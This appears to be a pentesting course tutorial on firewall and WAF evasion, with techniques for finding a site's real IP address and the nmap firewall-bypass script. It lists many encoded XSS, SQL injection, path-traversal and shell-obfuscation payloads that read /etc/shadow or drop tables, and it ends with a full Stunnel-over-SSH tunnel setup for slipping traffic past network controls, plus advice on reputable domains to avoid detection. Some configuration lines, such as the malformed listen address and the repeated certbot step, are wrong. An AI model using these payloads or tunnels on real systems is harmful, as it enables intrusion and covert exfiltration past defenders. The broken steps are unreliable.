---
title: "Firewall Evasion Techniques"
subtitle: "**Firewall Evasion Techniques: How to Evade WAF, Employ Tools Like NMAP, and Verify Bypass Methods for Optimized Network Security**"
tags: ["pentesting", "cybersecurity", "Firewalls"]
authors: ["blindma1den", "lorenagubaira"]

---

## Techniques employed by firewalls

Firewalls employ at least one of the following techniques to track network traffic:

1. **Packet filtering**: most firewalls are of this type. Small fragments of data called packets are examined by a series of filters as they attempt to enter the network. Then, depending on the source and destination IP addresses, protocols, and ports, the firewall decides whether they are allowed to enter or not.
2. **Application firewall/gateway**: by filtering traffic at the application level. To prevent direct connections between the device and incoming packets, proxy servers act as intermediaries.
3. **Next-generation firewall** (NGFW): to defend against network and web-based attacks, these sophisticated firewalls integrate classic network firewall technologies with web application firewalls (WAF). An NGFW also includes additional functions including antivirus, encrypted traffic inspection, and intrusion prevention systems (IPS). Deep packet inspection, which examines the data in the packet payload rather than simply the packet header, is a feature of an NGFW.
4. **Stateful inspection**: this is a newer technique that examines the packet for particular distinguishing features while comparing important components of the packet against a database. The package is allowed to pass if there is a reasonable match.

> **“Don't let your firewall become a weak link in your cybersecurity strategy”**

# Evasion methods

Although **firewalls and IDSs** can prevent malicious packets from entering a network, an attacker can send modified packets to the target so that it can bypass the IDS/Firewall. These are ten methods of evasion:

1. **Encrypting data**: by encrypting the data being transmitted, it becomes more difficult for the firewall or intrusion detection system to detect any malicious activity.
2. **VPN**: a virtual private network (VPN) can help bypass firewalls and intrusion detection systems by routing traffic through a secure server.
3. **Proxy server**: A proxy server can help mask the origin of traffic, making it difficult for the firewall or intrusion detection system to trace the source of an attack.
4. **TOR**: The TOR network can help mask the user's identity and the origin of the traffic, making it difficult for the firewall or intrusion detection system to detect any malicious activity.
5. **Port hopping**: By constantly changing the port used to transmit data, it becomes more difficult for the firewall or intrusion detection system to detect any malicious activity.
6. **Steganography**: By hiding data within another file or message, it is more difficult for the firewall or intrusion detection system to detect any malicious activity.
7. **Application layer protocols**: By using application layer protocols such as HTTP or SMTP, it is more difficult for the firewall or intrusion detection system to detect any malicious activity.
8. **Malicious code:** When using malicious code or malware, it is more difficult for the firewall or intrusion detection system to detect any malicious activity.
9. **Social engineering**: By tricking users into divulging confidential information or performing certain actions, it is easier for an attacker to bypass the firewall or intrusion detection system.
10. **Physical access: By physically accessing the network or system, an attacker can bypass the firewall or intrusion detection system.
11. **Outdated software: Firewalls rely on software to function properly, and this software must be updated periodically to keep up with the latest threats. If you do not update your firewall software, you may become vulnerable to attacks discovered since the last update.
12. **Weak passwords:** A strong and unique password is one of the most important ways to protect your firewall against breaches. If you use a weak or easy-to-guess password, hackers can easily access your firewall and compromise your system.
13. **Insecure remote access:** If you allow remote access to your system, it is essential to protect this access with a strong password and two-factor authentication. If these measures are not taken, hackers can potentially gain access to your firewall through remote access.
14. **Incorrectly configured rules:** Firewalls rely on rules to determine what traffic is allowed and what is blocked. If these rules are not configured correctly, unwanted traffic may be allowed to pass through the firewall and compromise your system.

> To protect your firewall against breaches, it is essential to regularly update your software, use strong passwords, protect against malware infections, protect remote access, and configure your firewall rules correctly.

## How to evade a WAF

### What to do to find the WAF provider and the real IP address?

Real IP Disclosure

1. RUN `shodan.io` or `censys.io`
2. Search for SPF records and TXT records.

SPF and TXT records can have an IP address of a non-CloudFlare point source.

> 3. You can also check securitytrails.com in the Historical data may have the original IP in the old records field.

**How to test that the WAF is configured correctly:**

- WAFs use standard ports 80, 443, 8000, 8008, 8080 and 8088.
- WAFs set their cookies on requests.
- WAFs are associated with separate headers.
- WAFs are exposed in the server header.
- WAFs are exposed in the response content.
- WAFs respond with unique response codes to malicious requests.
- Send a standard GET request from a browser, intercept, and log response headers (specific cookies).
- Send a request from the command line (e.g., cURL) and then verify the content and headers of the response.
- Send GET requests to random open ports and verify banners that may expose the identity of WAFs.
- Test some SQL injection payloads such as: or 1 = 1: to log into forms or forget a password.
- Try noisy XSS payloads like <script>confirm()</script> in some input fields.
- Try adding ../../../etc/passwd to a random parameter in the URL.
- Add some payloads like ' OR SLEEP(5) OR ' at the end of URLs to any random parameter.
- Send GET requests with deprecated protocols such as HTTP/0.9 (HTTP/0.9 does not support POST queries).
- Refer to the server header for different types of interactions.
- Send a raw FIN&RST packet to the server and identify a response.
- Side channel attacks: examine the temporal behavior of the request and response content.

## Tools to verify and bypass WAF

> w3af: web application attack and auditing framework

- **[wafw00f](https://github.com/EnableSecurity/wafw00f)**: Identify and fingerprint the web application firewall

- **[BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history):** bypass firewalls abusing DNS history. This tool will look for old DNS A records and check if the server is responding for that domain.

- **[CloudFail](https://github.com/m0rtem/CloudFail)**: is a tactical reconnaissance tool that tries to find the original IP address behind the Cloudflare WAF.

## Techniques to bypass WAF:

### 1. Case-switching technique

Combine uppercase and lowercase characters to create efficient payloads.

**Basic request:**

```bash
<script>confirm()</script>
```

**Skipped technique:**

```bash
<ScrIpT>confirm()</sCRiPt>
```

**Basic request:**

- SELECT * FROM * WHERE OWNER = 'NAME_OF_DB'

**Technique omitted:**

- sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

**Example in URL:**

> http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4

### 2. URL Encoding Technique

Encode normal payloads with % URL encoding/encoding. You can use Burp Suite. You have an encoder/decoder tool.

**Blocked by WAF:**

```bash
<Svg/x=“>”/OnLoAD=confirm()//
```

**Skipped technique:**

```bash
%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F
```

**Blocked by WAF:**

```bash
UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)
```

**Technique omitted:** > UniOn%28SeLeCt

```bash
UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29
```

**Example URL:**

> https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

### 3. Unicode Technique

ASCII characters in Unicode encoding provide excellent variants to avoid WAF. Encode all or part of the payload to get results.

**Basic request:**

```bash
<marquee onstart=prompt()>
```

**Ofused:**

```bash
<marquee onstart=\u0070r\u06f\u006dpt()>
```

**Blocked by WAF:**

```bash
/?redir=http://google.com
```

***Technique skipped:**

```bash
/?redir=http://google。com (Unicode alternative)
```

**Blocked by WAF:**

```bash
<marquee loop=1 onfinish=alert()>x
```

**Skipped technique:**

```bash
＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative).
```

**Basic request:**.

> ../.../etc/shadow

**Ofused:**

```bash
%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
```

### 4. HTML Rendering Technique

Web applications encode special characters in HTML. Encode and render them accordingly. Basic bypass cases with numeric and generic HTML encoding.

**Basic request:**

```bash
<img src=x onerror=confirm()>
```

**Encoded payload:**

```bash
&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;
```

**Encoded payload:**

&#34;&#62;&#60;img src=x onerror=confirm#40;&#41;&#62;

### 5. Mixed encoding technique

These rules usually tend to filter a specific type of encoding. These filters can be avoided by mixed encoding payloads. New lines and tabs are added more to obfuscation.

**Obfuscate payload:**

```bash
<A HREF="h

tt p://6 6.000146.0x7.147/">XSS</A>
```

### 6. Commenting technique

Comments obfuscate standard payload vectors. Different payloads have different ways of being obfuscated.

**Blocked by WAF:**

```bash
<script>confirm()</script>
```

**Skipped technique:**

```bash
<!--><script>confirm/**/()/**/</script>
```

**Blocked by WAF:**

```bash
/?id=1+union+select+1,2--
```

**Skipped technique:**

```bash
/?id=1+un/**/ion+sel/**/ect+1,2--
```

Insert comments in the middle of attack strings. For example, /*!SELECT*/ can be overlooked by the WAF but passed to the target application and processed by a MySQL database.

**Example in URL:**

> index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4
>
>
> 'union%a0select pass from users#

**Example in URL:**

> index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3

### 7. Double encoding technique

Web Application Firewall filters tend to encode characters to protect the web application. Poorly developed filters (without recursive filters) can be skipped with double encoding.

**Basic request:**

> http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

**Obfuscate payload:**

> http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

**Basic request:**

```bash
<script>confirm()</script>
```

**Obfuscate payload:**

```bash
%253Cscript%253Econfirm()%253C%252Fscript%253E
```

### 8. Wildcard obfuscation technique

Various command line utilities use global patterns to work with multiple files. We can change them to execute system commands.

**Basic request:**

> /bin/cat /etc/passwd

**Obfuscate payload:**

> /???/??t /???/??ss??

**Characters used:**

> / ? t s

**Basic request:**

> /bin/nc 127.0.0.1 443

**Obfuscate payload:**

> /???/n? 2130706433 443

**Characters used:**

> / ? n [0-9]

### 9. Dynamic payload generation technique

Programming languages have different patterns and syntax for concatenation. This allows us to generate payloads that can bypass many filters and rules.

**Basic request:**

```bash
<script>confirm()</script>
```

**Obfuscate payload:**

```bash
<script>eval('con'+'fi'+'rm()')</script>
```

**Basic request:**

> /bin/cat /etc/shadow

**Obfuscate payload:**

> /bi'n'''/c''at' /e'tc'/sh''ad'ow

Bash allows the concatenation of paths for execution.

**Basic request:**

```bash
<iframe/onload='this["src"]="javascript:confirm()"';>
```

**Obfuscate payload**

```bash
<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>
```

### 10. Junk character technique

WAF easily filters simple payloads. Adding some junk characters helps avoid detection (only in specific cases). This technique often helps confuse regex-based firewalls.

**Basic request:**

```bash
<script>confirm()</script>
```

**Obfuscate payload:**

```bash
<script>+-+-1-+-+confirm()</script>
```

**Basic request:**

```bash
<BODY onload=confirm()>
```

**Obfuscate payload:**

```bash
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>
```

**Basic request:**

```bash
<a href=javascript;alert()>ClickMe
```

**Skipped technique:**

```bash
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
```

### 11. Newline technique

Many regex-filtering WAFs effectively block many attempts. The newline (CR and LF) technique can break the firewall's regular expression and skip things.

**Basic request:**

```bash
<iframe src=javascript:confirm(hacker)">
```

**Obfuscate payload:**

```bash
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">
```

### 12. Uninitialized variable technique

Incorrect regex-based filters can be bypassed with uninitialized bash variables. Such a value equals null and acts like empty strings. Bash and Perl allow this type of interpretation.

First-level obfuscation: Normal

**Basic request:**

> /bin/cat /etc/shadow

**Obfuscate payload:**

> /bin/cat$u /etc/shadow$u

Second-level obfuscation: position-based

**Basic request:**

> /bin/cat /etc/shadow

**Obfuscate payload:**

> $u/bin$u/cat$u $u/etc$u/shadow$u

Third-level obfuscation: random characters

**Basic request:**

> /bin/cat /etc/passwd

**Obfuscate payload:**

> $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff

### 13. Tabs and line feed technique

Tabs often help evade firewalls, especially regex-based ones. Tabs can help break the WAF regex when the regex expects white spaces and not tabs.

**Basic request:**

```bash
<IMG SRC="javascript:confirm();">
```

**Skipped technique:**

```bash
<IMG SRC=" javascript:confirm();">
```

**Variant:**

```bash
<IMG SRC=" jav ascri pt:confirm ();">
```

**Basic request:**

> http://test.com/test?id=1 union select 1,2,3

**Skipped technique**:

> http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3

**Basic request:**

```bash
<iframe src=javascript:confirm()></iframe>
```

**Obfuscate payload:**

```bash
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>
```

### 14. Token breaker technique

Token-breaking attacks attempt to break the logic of splitting a request into tokens with token-breakers. Token-breakers are symbols that allow affecting the match between an element in a string and a particular token. Our request must remain valid while using token-breakers.

Case study: unknown token to the "tokenizer"

**Our payload:**

```bash
?id=‘-sqlite_version() UNION SELECT passwords FROM users --
```

Case study: context unknown to the parser (observe the bracket without context)

**First payload:**

```bash
?id=12);DROP TABLE users --
```

**Second payload:**

```bash
?id=133) INTO OUTFILE ‘xxx’ --
```

### 15. Obfuscation technique in other formats

Many web applications support different types of encoding and can interpret encoding. We always need to obfuscate the payload to a format that WAF does not support, but the server can smuggle our payload.

Case IIS:

IIS 6, 7.5, 8, and 10 allow IBM037 character interpretations. Send encoded parameters with the query.

**Original request:**

```bash
POST /example.aspx?id7=sometext HTTP/1.1

HOST: target.org

Content-Type: application/x-www-form-urlencoded; charset=utf-8

Content-Length: 27

id2='union all select * from users--
```

**Request obfuscated with URL encoding:**

```bash
POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1

HOST: target.org

Content-Type: application/x-www-form-urlencoded; charset=ibm037

Content-Length: 127

%89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60
```

## NMAP - Script firewall-bypass

Detects a vulnerability in netfilter and other firewalls that use helpers to dynamically open ports for protocols like FTP and SIP. The script works by spoofing a packet from the target server requesting to open a related connection to a target port that will be fulfilled by the firewall via the appropriate protocol helper port. For this to work, the attacking machine must be on the same network segment as the firewall. The script supports the FTP helper in both IPv4 and IPv6. The real path filter is used to prevent such attacks.

Download: **[https://svn.nmap.org/nmap/scripts/firewall-bypass.nse](https://svn.nmap.org/nmap/scripts/firewall-bypass.nse)**

For more information, see:

- **[http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/](http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/)**

**Arguments**

- firewall-bypass.helper

- The helper to use. The default is ftp. Supported helpers: ftp (both IPv4 and IPv6).

**firewall-bypass.targetport**

Port to test the vulnerability. The target port must be a non-open port. If not provided, the script will attempt to find a filtered or closed port from the port scan results.

**firewall-bypass.helperport**

> If you do not use the wizard's default port.

**examples**

```bash
nmap --script firewall-bypass <target>

nmap --script firewall-bypass --script-args firewall-bypass.helper=“ftp”, firewall-bypass.targetport=22 <target>
```

**output**

```bash
Host script results:

| Firewall omission:

|_ Firewall vulnerable to omission via ftp wizard (IPv4)
```

**How to bypass firewalls by hiding all traffic on HTTPS(SSL)443 encapsulated traffic**.

Generally, when behind a public or blocked firewall, most outbound (outgoing) traffic allowed is port 80(http) and 443(https). This is to allow only web browsing and prevent the use of other applications and services such as email or gaming. Outgoing web traffic can also be restricted by content filtering, allowing what type of websites can be accessed. Another major concern is privacy. When you use public networks or even use your own ISP's network, all your traffic is visible to them.

With this reverse proxy setup, we can mask all of our traffic to essentially appear as HTTPS traffic, allowing us to bypass many of these restrictions. This can also be used as an alternative to VPNs or in conjunction with VPNs to further mask traffic and provide more privacy. This method will work in most situations. Sometimes SSL inspection is configured or advanced content filtering and/or threat intelligence is leveraged, which increases traffic blocking factors. However, these scenarios typically only occur in mature corporate environments and not on average public networks.

We will host a reverse proxy on the Internet. With a tool called Stunnel, we can create an encrypted port forwarding tunnel over a 443 (HTTPS) connection. We will then use that port forwarding to create a hidden SSH tunnel inside the encrypted 443(SSL) traffic, which will allow us to set up a nested socket proxy OR a port forwarding, which in turn will allow us to send any traffic we want outside the network.

![firewall-bypass](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/firewall-bypass.png?raw=true)

### Requirements

For this implementation, I will use an Ubuntu 23.04 VPS (virtual private server) for the reverse proxy server and Kali 6.3.0 for the client machine. This configuration does not require these operating systems specifically. If you decide to use different operating systems, make sure the tools are compatible.

Reverse proxy server:

- [LetsEncrypt (free SSL certificate service)](https://letsencrypt.org/docs/faq/)
- Purchased domain to create a valid SSL certificate (can be an inexpensive domain, i.e. $1.99/year)

Tools/Services

- [apache2](https://httpd.apache.org/)
- [certbot](https://certbot.eff.org/)
- [stunnel(server mode)](https://www.stunnel.org/)

Client machine:

Tools

- [stunnel(client mode)](https://www.stunnel.org/)

### Configuration

Reverse Proxy Server

The server will require the most configuration effort. Since this is a new Ubuntu installation, we will update and upgrade the server.

```bash
sudo apt update && sudo apt upgrade -y
```

Now, we need to install the apache2 service and then run certbot to receive our SSL certificate from LetsEncrypt. This allows us to receive a signed SSL certificate related to our domain for the reverse proxy server.

**Install Apache2**

```bash
sudo apt update

sudo apt install apache2
```

Considering that the server runs services and is accessible from the Internet, we will create host-based firewall rules.

Create host-based firewall rules

```bash

sudo ufw allow 22/tcp

sudo ufw allow 80/tcp

sudo ufw allow 443/tcp
```

Feel free to add more firewall rules as needed for any other services you decide to run. Now that the rules have been created, we need to enable them.

Enable firewall rules

```bash
sudo ufw reload
```

Enable Apache2 service

```bash
sudo systemctl start apache2
```

Now, as explained on the certbot website, we will use the apache2 service to request our signed SSL certificate for the purchased domain. If you don't already have one, this is the time to purchase a domain before proceeding. The domain we purchase is important because this is where all of our tunneled traffic will be seen as it passes through the network and firewall. Choose a generic or innocent domain name with a common top level domain such as .com, .net, .io, etc. (Threat intelligence firewalls have been known to block cheap or uncommon domains such as .xyz).

The registrar usually provides DNS services that you will use for the domain you purchased. Once you have created a DNS A record and pointed to your reverse proxy server, you are ready to receive your SSL certificate using certbot. Certbot is a script that automates the creation of SSL certificates with LetsEncrypt. For specific instructions, which may vary depending on your reverse proxy server's operating system, [visit here](https://certbot.eff.org/instructions)

**Install Certbot**

```bash
sudo snap install --classic certbot

sudo ln -s /snap/bin/certbot /usr/bin/certbot
```

Before running cerbot, we will edit the configuration file /etc/apache2/sites-available/000-default.conf so that the cerbot script can identify our server by the acquired domain name.

Editing the Apache2 configuration file

```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```

Add the following line to the configuration file.

```bash
ServerName yourdomain.net
```

![yourdomain.net](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net.png?raw=true)

Now it is time to receive our SSL certificate and start configuring Stunnel.

Run certbot

```bash
sudo snap install --classic certbot
```

Once this runs successfully, you should see the result of where your new SSL certificate and private key are located.

```bash
cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem

key = /etc/letsencrypt/live/yourourdomain.net/privkey.pem
```

We no longer need the apache2 service now that we have used certbot to obtain our valid SSL certificate. The service must be stopped so that Stunnel can later use the 443 listening port.

Stop the Apache2 service

```bash
sudo systemctl stop apache2
```

Stunnel can now be configured. Install it on the reverse proxy server.

Install Stunnel

```bash
sudo apt update

sudo apt install stunnel4
```

Create/edit the Stunnel configuration file on the server to use our new SSL certificate. We will define its listening port and forwarding instructions.

```bash
sudo vim /etc/stunnel/stunnel.conf
```

Add the following lines to the configuration file

```bash
pid = /var/run/stunnel.pid

cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem

key = /etc/letsencrypt/live/yourourdomain.net/privkey.pem

[ssh]

accept = 0.0.0.0.0:443

connect = localhost:22
```

![yourdomain.net1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net1.png?raw=true)

Edit the additional Stunnel configuration file to enable the service

```bash
sudo vim /etc/default/stunnel4
```

Add the following line to the end of the configuration file

> ENABLED=1

![yourdomain.net2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net2.png?raw=true)

Start the tunnel service

```bash
sudo /etc/init.d/stunnel4 restart
```

To make sure that the Stunnel service is running and listening on the specified port 443, run the following command

```bash
sudo netstat -ano | grep tcp
```

![yourdomain.net3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net3.png?raw=true)

If you see that your reverse proxy server is listening on port 443 after starting the Stunnel service, you are all set! Now let's move on to the client machine, configure the Stunnel client, and start bypassing it.

### Client machine

Update and upgrade the new Kali installation on the client machine.

```bash
sudo apt update && sudo apt upgrade -y
```

Now that our client machine is updated and ready to go, we need to install Stunnel.

**install Stunnel**

```bash
sudo apt install stunnel4
```

Create a configuration file for the Stunnel client. This can be created anywhere, but I will create mine in the $HOME directory.

Create configuration file

```bash
vim $HOME/stunnel-client.conf
```

Add the following lines to the configuration file

```bash
pid = /tmp/stunnel.pid

client=yes

[ssh]

accept=9443

connect=yourdomain.net:443
```

![Client1 Machine](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente1.png?raw=true)

Run the Stunnel client to connect to the reverse proxy server by setting up the SSL(443) tunnel

```bash
sudo stunnel $HOME/stunnel-client.conf
```

Now confirm if the client is listening on its forwarding port defined in the configuration file.

```bash
sudo netstat -an | grep tcp
```

![Client2 Machine](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente2.png?raw=true)

**Avoiding**

The reverse proxy server is fully installed and configured. We can successfully connect from our client machine using Stunnel to create the SSL (443) tunnel. Now we will configure our SSH forward port or sockets proxy which will be hidden inside our SSL (443) tunnel.

SSH sockets 4/5 Proxy

This SSH tunnel will open a socket proxy on the client machine that will forward any traffic sent to it through the SSH tunnel that is hidden inside the SSL (443) tunnel.

Create the SSH sock proxy tunnel

```bash
sudo ssh -D 9090 -q -C -N <user>@127.0.0.1 -p 9443
```

- D : specifies the listening port of the socks proxy on the client
- q : runs quiet mode where no output is displayed locally
- C : compress data in the tunnel to save bandwidth
- N : non=interactive ssh session just creats the tunnel, no command prompt
- p : defines the destination port to connect to (We are connecting to port forward provided by Stunnel client)

![Client Machine3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente3.png?raw=true)

SSH port forwarding

This SSH tunnel will create a listening port on the client machine to forward traffic through the SSH tunnel that is hidden inside the SSL (443) tunnel.

Creating the SSH port forwarding tunnel

```bash
sudo ssh -q -C -N -L 9090:<destination ip>:<destination port> <user>@127.0.0.1 -p 9443
```

- L : specifies the listening port of the port forward on the client
- q : runs quiet mode where no output is displayed locally
- C : compress data in the tunnel to save bandwidth
- N : non-interactive ssh session just creats the tunnel no command prompt
- p : defines the destination port to connect to (We are connecting to port forward provided by Stunnel client)

![Client Machine4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente4.png?raw=true)

## Conclusion

With this configuration and reverse proxy server technique, we can make all O-specific traffic appear as HTTPS(443). Once the client establishes its SSL tunnel with the reverse proxy server, the firewall cannot distinguish between our SSL tunnel and normal HTTPS(443) traffic due to encryption. On public networks in general, this is sufficient to bypass firewall restrictions. This also works as a VPN alternative in networks where VPN traffic is blocked. Remember that only TCP traffic can pass through the SSH Socks proxy or port forwarding.

When it comes to advanced firewalls, many additional factors can determine whether the SSL connection is allowed through port 443. More advanced firewalls can not only perform SSL inspection (decryption) but can also make decisions to allow traffic based on the destination geographic IP address, location, SSL certificate attributes, domain categorization, and domain reputation. This is where it is crucial to choose a domain with a common TLD (top-level domain) and a generally trusted country to host the reverse proxy server.

> 👉 It would be recommended to register an expired domain that already has URL categorization and a good reputation. If you have purchased a new domain, there are ways to categorize it and create a domain reputation. These will not be covered here but will be addressed in another blog. If you made it this far, I hope it was helpful and I'm sure you'll come up with some creative use cases for this setup.

It is essential to first understand how a firewall works before attempting to hack into it. A firewall tracks all network traffic, both inbound and outbound, and, depending on the rules that have been configured, allows or prohibits that traffic from reaching its destination. The fact that firewalls are often the initial line of defense in a network makes them an example of perimeter security.

Let's summarize everything written above. Always think outside the box. Try different encryption techniques and some will work. Don't be lazy to check DNS records. Don't forget that any protection on web resources can be circumvented, and WAF is not a panacea for all problems. Hackers don't sleep and are always looking for new techniques to attack your resources and make a profit. Periodic penetration testing will help you avoid many problems.



